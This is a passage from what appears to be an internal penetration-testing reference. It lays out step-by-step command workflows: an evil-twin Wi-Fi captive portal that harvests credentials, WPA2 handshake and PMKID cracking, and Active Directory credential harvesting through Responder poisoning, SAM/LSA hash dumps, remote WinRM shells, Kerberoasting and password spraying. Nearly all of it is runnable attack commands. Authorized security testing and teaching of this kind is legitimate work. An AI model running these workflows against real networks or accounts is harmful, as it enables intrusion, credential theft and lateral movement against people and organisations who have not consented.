http.server on                        # Serve captive portal page
set http.server.path /path/to/portal  # Portal HTML directory
```

#### Captive Portal Evil Twin Workflow (bettercap)

```bash
# 1. Identify target AP SSID and channel
sudo bettercap -iface wlan0

# In bettercap:
wifi.recon on
wifi.show

# 2. Stop recon, configure rogue AP
wifi.recon off
set wifi.ap.ssid "TargetNetwork"
set wifi.ap.channel 6
wifi.ap on

# 3. Start DHCP (external dnsmasq or bettercap's dhcp module)
dhcp6.server on
# Or external dnsmasq

# 4. Redirect all HTTP to captive portal
set dns.spoof.domains *
dns.spoof on
set http.server.path /opt/portals/wifi_login/
http.server on

# 5. Collect submitted credentials from HTTP server logs
# Monitor /opt/portals/wifi_login/capture.php or similar
```

---

## 14. End-to-End Attack Workflows

### Workflow A: Corporate WPA2-PSK Network Audit

```bash
# Objective: Test WPA2-PSK password strength for authorized client network

# Phase 1: Reconnaissance
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
# Note: BSSID=AA:BB:CC:DD:EE:FF, Channel=11, SSID=CorpGuest, Client=11:22:33:44:55:66

# Phase 2: Targeted capture
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 11 -w /tmp/corpguest wlan0mon

# Phase 3: Force handshake (separate terminal)
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Phase 4: Verify + convert
aircrack-ng /tmp/corpguest-01.cap    # confirm "1 handshake"
hcxpcapngtool -o /tmp/corpguest.hc22000 /tmp/corpguest-01.cap

# Phase 5: Crack (GPU)
hashcat -m 22000 -a 0 /tmp/corpguest.hc22000 rockyou.txt -w 3
hashcat -m 22000 -a 0 /tmp/corpguest.hc22000 rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule -w 3
hashcat -m 22000 -a 3 /tmp/corpguest.hc22000 ?d?d?d?d?d?d?d?d    # router default
hashcat -m 22000 --show /tmp/corpguest.hc22000

# Phase 6: Cleanup
sudo airmon-ng stop wlan0mon
sudo service NetworkManager start
```

### Workflow B: Active Directory Credential Harvesting

```bash
# Objective: Harvest credentials from a Windows domain environment
# Requires: Kali on same network segment as Windows hosts

# Phase 1: Host discovery
nxc smb 192.168.10.0/24

# Phase 2: Password policy (before any spraying)
nxc smb 192.168.10.10 -u '' -p '' --pass-pol

# Phase 3: User enumeration
nxc smb 192.168.10.10 -u '' -p '' --rid-brute | grep SidTypeUser > users.txt
nxc ldap 192.168.10.10 -u guest -p '' --users >> users.txt

# Phase 4: LLMNR/NBT-NS poisoning to capture NTLMv2
sudo responder -I eth0 -rdwFbPv &
# Wait for hashes — collected in /usr/share/responder/logs/

# Phase 5: Crack hashes
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2*.txt \
  rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Phase 6: Validate cracked credentials
nxc smb 192.168.10.0/24 -u alice -p 'CrackedPassword1!'
# Look for [+] (valid) vs [-] (invalid)

# Phase 7: Check for local admin
nxc smb 192.168.10.0/24 -u alice -p 'CrackedPassword1!' --local-auth

# Phase 8: Dump hashes if admin
nxc smb 192.168.10.50 -u alice -p 'CrackedPassword1!' --sam
nxc smb 192.168.10.50 -u alice -p 'CrackedPassword1!' --lsa

# Phase 9: WinRM shell
evil-winrm -i 192.168.10.50 -u alice -p 'CrackedPassword1!'

# Phase 10: Post-exploitation (in Evil-WinRM shell)
# Run Mimikatz, dump more hashes, lateral movement
```

### Workflow C: PMKID Attack (Clientless)

```bash
# Objective: Crack WPA2 without waiting for a client connection

# Phase 1: Capture PMKID
sudo airmon-ng check kill
sudo hcxdumptool -i wlan0 -o /tmp/pmkid_capture.pcapng \
  --active_beacon --enable_status=3

# Run for 15-20 minutes — PMKID appears nearly instantly from active APs

# Phase 2: Convert
hcxpcapngtool -o /tmp/pmkid.hc22000 /tmp/pmkid_capture.pcapng
hcxhashtool -i /tmp/pmkid.hc22000 --info=stdout    # verify contents

# Phase 3: Targeted crack by SSID
hcxhashtool -i /tmp/pmkid.hc22000 \
  --essid-list=target_ssids.txt \
  -o /tmp/target.hc22000

# Phase 4: GPU crack
hashcat -m 22000 -a 0 /tmp/target.hc22000 rockyou.txt
hashcat -m 22000 -a 3 /tmp/target.hc22000 ?d?d?d?d?d?d?d?d
hashcat -m 22000 -a 0 /tmp/target.hc22000 rockyou.txt \
  -r /usr/share/hashcat/rules/dive.rule
```

### Workflow D: Kerberoasting + Cracking

```bash
# Objective: Extract and crack service account credentials from AD

# Prerequisites: Valid domain user credentials

# Phase 1: Request service tickets via CME
nxc ldap dc01.corp.local -u alice -p 'Password1!' \
  --kerberoasting /tmp/kerberoast_hashes.txt

# Or via impacket
impacket-GetUserSPNs corp.local/alice:Password1! \
  -dc-ip 192.168.10.10 -outputfile /tmp/kerberoast.txt

# Phase 2: Crack
hashcat -m 13100 -a 0 /tmp/kerberoast.txt rockyou.txt
hashcat -m 13100 -a 0 /tmp/kerberoast.txt rockyou.txt \
  -r /usr/share/hashcat/rules/dive.rule
hashcat -m 13100 --show /tmp/kerberoast.txt

# Phase 3: Use cracked service account
nxc smb 192.168.10.0/24 -u svc_sql -p 'ServiceAcc0unt!'
nxc mssql 192.168.10.50 -u svc_sql -p 'ServiceAcc0unt!'
```

### Workflow E: Windows Password Spraying (Low and Slow)

```bash
# Objective: Test common passwords against all domain accounts
# CRITICAL: Check password policy first to avoid lockouts

# Phase 1: Get password policy
nxc smb 192.168.10.10 -u alice -p 'Password1!' --pass-pol
# Note: lockout threshold, observation window, lockout duration

# Phase 2: Enumerate users
nxc smb 192.168.10.10 -u alice -p 'Password1!' --users | \
  awk '{print $5}' | sort -u > domain_users.txt

# Phase 3: Spray (stay below lockout threshold)
# If threshold is 5 attempts / 30 min:
# Test 1 password per 35 minutes max
nxc smb 192.168.10.0/24 -u domain_users.txt -p 'Winter2024!' \
  --no-bruteforce --continue-on-success

nxc smb 192.168.10.0/24 -u domain_users.txt -p 'Welcome1' \
  --no-bruteforce --continue-on-success

# Common passwords to spray (in order):
# <Season><Year>!, Password1!, Welcome1, Company2024!, <CompanyName>1!

# Phase 4: Validate hits
nxc smb 192.168.10.0/24 -u validuser -p 'Winter2024!'
```

---

## Quick Reference: Hash Type Cheat Sheet

| Scenario | hashcat -m | john --format | Source |
|----------|-----------|---------------|--------|
| Windows local user | 1000 | NT | SAM dump |
| Windows domain | 1000 | NT | NTDS.dit / Mimikatz |
| Linux /etc/shadow (md5crypt) | 500 | md5crypt | shadow file |
| Linux /etc/shadow (sha512) | 1800 | sha512crypt | shadow file |
| WPA2 handshake | 22000 | wpapsk-pmk | airodump/hcxdumptool |
| NTLM relay (NetNTLMv2) | 5600 | netntlmv2 | Responder |
| Kerberoast TGS | 13100 | krb5tgs | GetUserSPNs |
| ASREPRoast | 18200 | krb5asrep | GetNPUsers |
| bcrypt | 3200 | bcrypt | Web apps |
| MD5 | 0 | raw-md5 | Web/DB dumps |
| SHA1 | 100 | raw-sha1 | Web/DB dumps |
| SHA256 | 1400 | raw-sha256 | Web/DB dumps |
| MySQL 4.1+ | 300 | mysql-sha1 | MySQL dump |
| MSSQL 2012+ | 1731 | mssql12 | MSSQL dump |

---

## Quick Reference: Interface Setup One-Liners

```bash
# Kill conflicting, start monitor
sudo airmon-ng check kill && sudo airmon-ng start wlan0

# Set specific channel
sudo iwconfig wlan0mon channel 6
# Or:
sudo iw dev wlan0mon set channel 6

# Restore managed mode
sudo airmon-ng stop wlan0mon && sudo service NetworkManager start

# Check interface mode
iwconfig wlan0 | grep Mode
iw dev wlan0 info | grep type

# List nearby APs (quick scan)
sudo iwlist wlan0 scan | grep -E "ESSID|Channel|Encryption|Signal"

# Check WPS status on all APs
sudo wash -i wlan0mon

# Monitor TX power
iwconfig wlan0mon | grep 'Tx-Power'
```

---

## Wordlist Resources

```bash
# Built-in Kali
/usr/share/wordlists/rockyou.txt          # 14M passwords
/usr/share/wordlists/fasttrack.txt        # ~250 corporate passwords
/usr/share/seclists/                      # SecLists collection
/usr/share/wordlists/dirbuster/           # Web paths

# Install SecLists
sudo apt install seclists
ls /usr/share/seclists/Passwords/

# Generate custom wordlist with Crunch
crunch 8 10 abcdefghijklmnopqrstuvwxyz0123456789 -o /tmp/custom.txt
crunch 8 8 -t Pass@@@@ -o pins.txt     # Pass followed by 4 digits

# Generate from target info with CeWL
cewl https://www.targetcorp.com -d 3 -m 5 -w /tmp/targetcorp_words.txt

# Merge and deduplicate
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# hashcat-utils: split/merge/dedupe
# /usr/lib/hashcat-utils/

# Username lists
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/Names/names.txt
```

---

*Document version: 1.0 — Zia Venture Group Internal Reference — April 2026*
*For authorized penetration testing and security research only.*
